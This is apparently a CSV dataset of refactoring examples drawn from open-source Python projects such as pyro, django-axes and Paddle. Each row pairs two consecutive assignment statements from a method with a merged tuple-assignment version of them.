repo_name,file_html,class_name,me_name,me_code,old_code,new_code
pyro,https://github.com/pyro-ppl/pyro/tree/master/pyro/infer/csis.py,CSIS,_get_matched_trace$161,"def _get_matched_trace(self, model_trace, *args, **kwargs):
        """"""
        :param model_trace: a trace from the model
        :type model_trace: pyro.poutine.trace_struct.Trace
        :returns: guide trace with sampled values matched to model_trace
        :rtype: pyro.poutine.trace_struct.Trace

        Returns a guide trace with values at sample and observe statements
        matched to those in model_trace.

        `args` and `kwargs` are passed to the guide.
        """"""
        kwargs[""observations""] = {}
        for node in itertools.chain(
            model_trace.stochastic_nodes, model_trace.observation_nodes
        ):
            if ""was_observed"" in model_trace.nodes[node][""infer""]:
                model_trace.nodes[node][""is_observed""] = True
                kwargs[""observations""][node] = model_trace.nodes[node][""value""]

        guide_trace = poutine.trace(poutine.replay(self.guide, model_trace)).get_trace(
            *args, **kwargs
        )

        check_model_guide_match(model_trace, guide_trace)
        guide_trace = prune_subsample_sites(guide_trace)

        return guide_trace","model_trace.nodes[node]['is_observed'] = True
kwargs['observations'][node] = model_trace.nodes[node]['value']","model_trace.nodes[node]['is_observed'] , kwargs['observations'][node]  = True, model_trace.nodes[node]['value']"
mobly,https://github.com/google/mobly/tree/master/mobly/controllers/android_device_lib/services/sl4a_service.py,Sl4aService,__init__$28,"def __init__(self, device, configs=None):
    del configs  # Never used.
    self._ad = device
    self._sl4a_client = None","self._ad = device
self._sl4a_client = None","self._ad , self._sl4a_client  = device, None"
django-axes,https://github.com/jazzband/django-axes/tree/master/axes/handlers/database.py,AxesDatabaseHandler,user_login_failed$117,"def user_login_failed(self, sender, credentials: dict, request=None, **kwargs):
        """"""When user login fails, save AccessFailureLog record in database,
        save AccessAttempt record in database, mark request with
        lockout attribute and emit lockout signal.

        """"""

        log.info(""AXES: User login failed, running database handler for failure."")

        if request is None:
            log.error(
                ""AXES: AxesDatabaseHandler.user_login_failed does not function without a request.""
            )
            return

        # 1. database query: Clean up expired user attempts from the database before logging new attempts
        clean_expired_user_attempts(request.axes_attempt_time)

        username = get_client_username(request, credentials)
        client_str = get_client_str(
            username,
            request.axes_ip_address,
            request.axes_user_agent,
            request.axes_path_info,
            request,
        )

        # If axes denied access, don't record the failed attempt as that would reset the lockout time.
        if (
            not settings.AXES_RESET_COOL_OFF_ON_FAILURE_DURING_LOCKOUT
            and request.axes_locked_out
        ):
            request.axes_credentials = credentials
            user_locked_out.send(
                ""axes"",
                request=request,
                username=username,
                ip_address=request.axes_ip_address,
            )
            return

        # This replaces null byte chars that crash saving failures.
        get_data = get_query_str(request.GET).replace(""\0"", ""0x00"")
        post_data = get_query_str(request.POST).replace(""\0"", ""0x00"")

        if self.is_whitelisted(request, credentials):
            log.info(""AXES: Login failed from whitelisted client %s."", client_str)
            return

        # 2. database query: Get or create access record with the new failure data
        if settings.AXES_ONLY_USER_FAILURES and username is None:
            log.warning(
                ""AXES: Username is None and AXES_ONLY_USER_FAILURES is enabled, new record will NOT be created.""
            )
        else:
            with transaction.atomic():
                (
                    attempt,
                    created,
                ) = AccessAttempt.objects.select_for_update().get_or_create(
                    username=username,
                    ip_address=request.axes_ip_address,
                    user_agent=request.axes_user_agent,
                    defaults={
                        ""get_data"": get_data,
                        ""post_data"": post_data,
                        ""http_accept"": request.axes_http_accept,
                        ""path_info"": request.axes_path_info,
                        ""failures_since_start"": 1,
                        ""attempt_time"": request.axes_attempt_time,
                    },
                )

                # Record failed attempt with all the relevant information.
                # Filtering based on username, IP address and user agent handled elsewhere,
                # and this handler just records the available information for further use.
                if created:
                    log.warning(
                        ""AXES: New login failure by %s. Created new record in the database."",
                        client_str,
                    )

                # 3. database query if there were previous attempts in the database
                # Update failed attempt information but do not touch the username, IP address, or user agent fields,
                # because attackers can request the site with multiple different configurations
                # in order to bypass the defense mechanisms that are used by the site.
                else:
                    separator = ""\n---------\n""

                    attempt.get_data = Concat(""get_data"", Value(separator + get_data))
                    attempt.post_data = Concat(
                        ""post_data"", Value(separator + post_data)
                    )
                    attempt.http_accept = request.axes_http_accept
                    attempt.path_info = request.axes_path_info
                    attempt.failures_since_start = F(""failures_since_start"") + 1
                    attempt.attempt_time = request.axes_attempt_time
                    attempt.save()

                    log.warning(
                        ""AXES: Repeated login failure by %s. Updated existing record in the database."",
                        client_str,
                    )

        # 3. or 4. database query: Calculate the current maximum failure number from the existing attempts
        failures_since_start = self.get_failures(request, credentials)
        request.axes_failures_since_start = failures_since_start

        if (
            settings.AXES_LOCK_OUT_AT_FAILURE
            and failures_since_start >= get_failure_limit(request, credentials)
        ):
            log.warning(
                ""AXES: Locking out %s after repeated login failures."", client_str
            )

            request.axes_locked_out = True
            request.axes_credentials = credentials
            user_locked_out.send(
                ""axes"",
                request=request,
                username=username,
                ip_address=request.axes_ip_address,
            )

        # 5. database entry: Log for ever the attempt in the AccessFailureLog
        if settings.AXES_ENABLE_ACCESS_FAILURE_LOG:
            with transaction.atomic():
                AccessFailureLog.objects.create(
                    username=username,
                    ip_address=request.axes_ip_address,
                    user_agent=request.axes_user_agent,
                    http_accept=request.axes_http_accept,
                    path_info=request.axes_path_info,
                    attempt_time=request.axes_attempt_time,
                    locked_out=request.axes_locked_out,
                )
                self.remove_out_of_limit_failure_logs(username=username)","get_data = get_query_str(request.GET).replace('\x00', '0x00')
post_data = get_query_str(request.POST).replace('\x00', '0x00')","get_data , post_data  = get_query_str(request.GET).replace('\x00', '0x00'), get_query_str(request.POST).replace('\x00', '0x00')"
django-axes,https://github.com/jazzband/django-axes/tree/master/axes/handlers/database.py,AxesDatabaseHandler,user_login_failed$117,"def user_login_failed(self, sender, credentials: dict, request=None, **kwargs):
        """"""When user login fails, save AccessFailureLog record in database,
        save AccessAttempt record in database, mark request with
        lockout attribute and emit lockout signal.

        """"""

        log.info(""AXES: User login failed, running database handler for failure."")

        if request is None:
            log.error(
                ""AXES: AxesDatabaseHandler.user_login_failed does not function without a request.""
            )
            return

        # 1. database query: Clean up expired user attempts from the database before logging new attempts
        clean_expired_user_attempts(request.axes_attempt_time)

        username = get_client_username(request, credentials)
        client_str = get_client_str(
            username,
            request.axes_ip_address,
            request.axes_user_agent,
            request.axes_path_info,
            request,
        )

        # If axes denied access, don't record the failed attempt as that would reset the lockout time.
        if (
            not settings.AXES_RESET_COOL_OFF_ON_FAILURE_DURING_LOCKOUT
            and request.axes_locked_out
        ):
            request.axes_credentials = credentials
            user_locked_out.send(
                ""axes"",
                request=request,
                username=username,
                ip_address=request.axes_ip_address,
            )
            return

        # This replaces null byte chars that crash saving failures.
        get_data = get_query_str(request.GET).replace(""\0"", ""0x00"")
        post_data = get_query_str(request.POST).replace(""\0"", ""0x00"")

        if self.is_whitelisted(request, credentials):
            log.info(""AXES: Login failed from whitelisted client %s."", client_str)
            return

        # 2. database query: Get or create access record with the new failure data
        if settings.AXES_ONLY_USER_FAILURES and username is None:
            log.warning(
                ""AXES: Username is None and AXES_ONLY_USER_FAILURES is enabled, new record will NOT be created.""
            )
        else:
            with transaction.atomic():
                (
                    attempt,
                    created,
                ) = AccessAttempt.objects.select_for_update().get_or_create(
                    username=username,
                    ip_address=request.axes_ip_address,
                    user_agent=request.axes_user_agent,
                    defaults={
                        ""get_data"": get_data,
                        ""post_data"": post_data,
                        ""http_accept"": request.axes_http_accept,
                        ""path_info"": request.axes_path_info,
                        ""failures_since_start"": 1,
                        ""attempt_time"": request.axes_attempt_time,
                    },
                )

                # Record failed attempt with all the relevant information.
                # Filtering based on username, IP address and user agent handled elsewhere,
                # and this handler just records the available information for further use.
                if created:
                    log.warning(
                        ""AXES: New login failure by %s. Created new record in the database."",
                        client_str,
                    )

                # 3. database query if there were previous attempts in the database
                # Update failed attempt information but do not touch the username, IP address, or user agent fields,
                # because attackers can request the site with multiple different configurations
                # in order to bypass the defense mechanisms that are used by the site.
                else:
                    separator = ""\n---------\n""

                    attempt.get_data = Concat(""get_data"", Value(separator + get_data))
                    attempt.post_data = Concat(
                        ""post_data"", Value(separator + post_data)
                    )
                    attempt.http_accept = request.axes_http_accept
                    attempt.path_info = request.axes_path_info
                    attempt.failures_since_start = F(""failures_since_start"") + 1
                    attempt.attempt_time = request.axes_attempt_time
                    attempt.save()

                    log.warning(
                        ""AXES: Repeated login failure by %s. Updated existing record in the database."",
                        client_str,
                    )

        # 3. or 4. database query: Calculate the current maximum failure number from the existing attempts
        failures_since_start = self.get_failures(request, credentials)
        request.axes_failures_since_start = failures_since_start

        if (
            settings.AXES_LOCK_OUT_AT_FAILURE
            and failures_since_start >= get_failure_limit(request, credentials)
        ):
            log.warning(
                ""AXES: Locking out %s after repeated login failures."", client_str
            )

            request.axes_locked_out = True
            request.axes_credentials = credentials
            user_locked_out.send(
                ""axes"",
                request=request,
                username=username,
                ip_address=request.axes_ip_address,
            )

        # 5. database entry: Log for ever the attempt in the AccessFailureLog
        if settings.AXES_ENABLE_ACCESS_FAILURE_LOG:
            with transaction.atomic():
                AccessFailureLog.objects.create(
                    username=username,
                    ip_address=request.axes_ip_address,
                    user_agent=request.axes_user_agent,
                    http_accept=request.axes_http_accept,
                    path_info=request.axes_path_info,
                    attempt_time=request.axes_attempt_time,
                    locked_out=request.axes_locked_out,
                )
                self.remove_out_of_limit_failure_logs(username=username)","request.axes_locked_out = True
request.axes_credentials = credentials","request.axes_locked_out , request.axes_credentials  = True, credentials"
pywikibot,https://github.com/wikimedia/pywikibot/tree/master/tests/http_tests.py,CharsetTestCase,test_content_type_application_json_without_charset$386,"def test_content_type_application_json_without_charset(self):
        """"""Test decoding without explicit charset but JSON content.""""""
        charset = None
        resp = CharsetTestCase._create_response(
            headers={'content-type': 'application/json'},
            data=CharsetTestCase.UTF8_BYTES)
        resp.encoding = http._decide_encoding(resp, charset)
        self.assertEqual('utf-8', resp.encoding)","charset = None
resp = CharsetTestCase._create_response(headers={'content-type': 'application/json'}, data=CharsetTestCase.UTF8_BYTES)","charset , resp  = None, CharsetTestCase._create_response(headers={'content-type': 'application/json'}, data=CharsetTestCase.UTF8_BYTES)"
LyricsGenius,https://github.com/johnwmillr/LyricsGenius/tree/master/lyricsgenius/api/api.py,API,annotation$84,"def annotation(self, annotation_id, text_format=None):
        """"""Gets data for a specific annotation.

        Args:
            annotation_id (:obj:`int`): annotation ID
            text_format (:obj:`str`, optional): Text format of the results
                ('dom', 'html', 'markdown' or 'plain').

        Returns:
            :obj:`dict`

        """"""
        params = {'text_format': text_format or self.response_format}
        endpoint = ""annotations/{id}"".format(id=annotation_id)
        return self._make_request(endpoint, params_=params)","params = {'text_format': text_format or self.response_format}
endpoint = 'annotations/{id}'.format(id=annotation_id)","params , endpoint  = {'text_format': text_format or self.response_format}, 'annotations/{id}'.format(id=annotation_id)"
addons,https://github.com/tensorflow/addons/tree/master/tensorflow_addons/layers/crf.py,CRF,add_boundary_energy$217,"def add_boundary_energy(self, potentials, mask, start, end):
        def expand_scalar_to_3d(x):
            # expand tensor from shape (x, ) to (1, 1, x)
            return tf.reshape(x, (1, 1, -1))

        start = tf.cast(expand_scalar_to_3d(start), potentials.dtype)
        end = tf.cast(expand_scalar_to_3d(end), potentials.dtype)
        if mask is None:
            potentials = tf.concat(
                [potentials[:, :1, :] + start, potentials[:, 1:, :]], axis=1
            )
            potentials = tf.concat(
                [potentials[:, :-1, :], potentials[:, -1:, :] + end], axis=1
            )
        else:
            mask = tf.keras.backend.expand_dims(tf.cast(mask, start.dtype), axis=-1)
            start_mask = tf.cast(self._compute_mask_left_boundary(mask), start.dtype)

            end_mask = tf.cast(self._compute_mask_right_boundary(mask), end.dtype)
            potentials = potentials + start_mask * start
            potentials = potentials + end_mask * end
        return potentials","start = tf.cast(expand_scalar_to_3d(start), potentials.dtype)
end = tf.cast(expand_scalar_to_3d(end), potentials.dtype)","start , end  = tf.cast(expand_scalar_to_3d(start), potentials.dtype), tf.cast(expand_scalar_to_3d(end), potentials.dtype)"
qtile,https://github.com/qtile/qtile/tree/master/libqtile/widget/moc.py,Moc,get_info$57,"def get_info(self):
        """"""Return a dictionary with info about the current MOC status.""""""
        try:
            output = self.call_process([""mocp"", ""-i""])
        except subprocess.CalledProcessError as err:
            output = err.output
        if output.startswith(""State""):
            output = output.splitlines()
            info = {""State"": """", ""File"": """", ""SongTitle"": """", ""Artist"": """", ""Album"": """"}

            for line in output:
                for data in info:
                    if data in line:
                        info[data] = line[len(data) + 2 :].strip()
                        break
            return info","output = output.splitlines()
info = {'State': '', 'File': '', 'SongTitle': '', 'Artist': '', 'Album': ''}","output , info  = output.splitlines(), {'State': '', 'File': '', 'SongTitle': '', 'Artist': '', 'Album': ''}"
imgclsmob,https://github.com/osmr/imgclsmob/tree/master/pytorch/pytorchcv/models/isqrtcovresnet.py,,get_isqrtcovresnet$247,"def get_isqrtcovresnet(blocks,
                       conv1_stride=True,
                       model_name=None,
                       pretrained=False,
                       root=os.path.join(""~"", "".torch"", ""models""),
                       **kwargs):
    """"""
    Create iSQRT-COV-ResNet model with specific parameters.

    Parameters:
    ----------
    blocks : int
        Number of blocks.
    conv1_stride : bool, default True
        Whether to use stride in the first or the second convolution layer in units.
    model_name : str or None, default None
        Model name for loading pretrained model.
    pretrained : bool, default False
        Whether to load the pretrained weights for model.
    root : str, default '~/.torch/models'
        Location for keeping the model parameters.
    """"""

    if blocks == 18:
        layers = [2, 2, 2, 2]
    elif blocks == 34:
        layers = [3, 4, 6, 3]
    elif blocks == 50:
        layers = [3, 4, 6, 3]
    elif blocks == 101:
        layers = [3, 4, 23, 3]
    elif blocks == 152:
        layers = [3, 8, 36, 3]
    elif blocks == 200:
        layers = [3, 24, 36, 3]
    else:
        raise ValueError(""Unsupported iSQRT-COV-ResNet with number of blocks: {}"".format(blocks))

    init_block_channels = 64
    final_block_channels = 256

    if blocks < 50:
        channels_per_layers = [64, 128, 256, 512]
        bottleneck = False
    else:
        channels_per_layers = [256, 512, 1024, 2048]
        bottleneck = True

    channels = [[ci] * li for (ci, li) in zip(channels_per_layers, layers)]

    net = iSQRTCOVResNet(
        channels=channels,
        init_block_channels=init_block_channels,
        final_block_channels=final_block_channels,
        bottleneck=bottleneck,
        conv1_stride=conv1_stride,
        **kwargs)

    if pretrained:
        if (model_name is None) or (not model_name):
            raise ValueError(""Parameter `model_name` should be properly initialized for loading pretrained model."")
        from .model_store import download_model
        download_model(
            net=net,
            model_name=model_name,
            local_model_store_dir_path=root)

    return net","init_block_channels = 64
final_block_channels = 256","init_block_channels , final_block_channels  = 64, 256"
imgclsmob,https://github.com/osmr/imgclsmob/tree/master/pytorch/pytorchcv/models/isqrtcovresnet.py,,get_isqrtcovresnet$247,"def get_isqrtcovresnet(blocks,
                       conv1_stride=True,
                       model_name=None,
                       pretrained=False,
                       root=os.path.join(""~"", "".torch"", ""models""),
                       **kwargs):
    """"""
    Create iSQRT-COV-ResNet model with specific parameters.

    Parameters:
    ----------
    blocks : int
        Number of blocks.
    conv1_stride : bool, default True
        Whether to use stride in the first or the second convolution layer in units.
    model_name : str or None, default None
        Model name for loading pretrained model.
    pretrained : bool, default False
        Whether to load the pretrained weights for model.
    root : str, default '~/.torch/models'
        Location for keeping the model parameters.
    """"""

    if blocks == 18:
        layers = [2, 2, 2, 2]
    elif blocks == 34:
        layers = [3, 4, 6, 3]
    elif blocks == 50:
        layers = [3, 4, 6, 3]
    elif blocks == 101:
        layers = [3, 4, 23, 3]
    elif blocks == 152:
        layers = [3, 8, 36, 3]
    elif blocks == 200:
        layers = [3, 24, 36, 3]
    else:
        raise ValueError(""Unsupported iSQRT-COV-ResNet with number of blocks: {}"".format(blocks))

    init_block_channels = 64
    final_block_channels = 256

    if blocks < 50:
        channels_per_layers = [64, 128, 256, 512]
        bottleneck = False
    else:
        channels_per_layers = [256, 512, 1024, 2048]
        bottleneck = True

    channels = [[ci] * li for (ci, li) in zip(channels_per_layers, layers)]

    net = iSQRTCOVResNet(
        channels=channels,
        init_block_channels=init_block_channels,
        final_block_channels=final_block_channels,
        bottleneck=bottleneck,
        conv1_stride=conv1_stride,
        **kwargs)

    if pretrained:
        if (model_name is None) or (not model_name):
            raise ValueError(""Parameter `model_name` should be properly initialized for loading pretrained model."")
        from .model_store import download_model
        download_model(
            net=net,
            model_name=model_name,
            local_model_store_dir_path=root)

    return net","channels_per_layers = [64, 128, 256, 512]
bottleneck = False","channels_per_layers , bottleneck  = [64, 128, 256, 512], False"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/fluid/tests/unittests/test_affine_channel_op.py,,affine_channel$24,"def affine_channel(x, scale, bias, layout):
    C = x.shape[1] if layout == 'NCHW' else x.shape[-1]
    if len(x.shape) == 4:
        new_shape = (1, C, 1, 1) if layout == 'NCHW' else (1, 1, 1, C)
    else:
        new_shape = (1, C)
    scale = scale.reshape(new_shape)
    bias = bias.reshape(new_shape)
    return x * scale + bias","scale = scale.reshape(new_shape)
bias = bias.reshape(new_shape)","scale , bias  = scale.reshape(new_shape), bias.reshape(new_shape)"
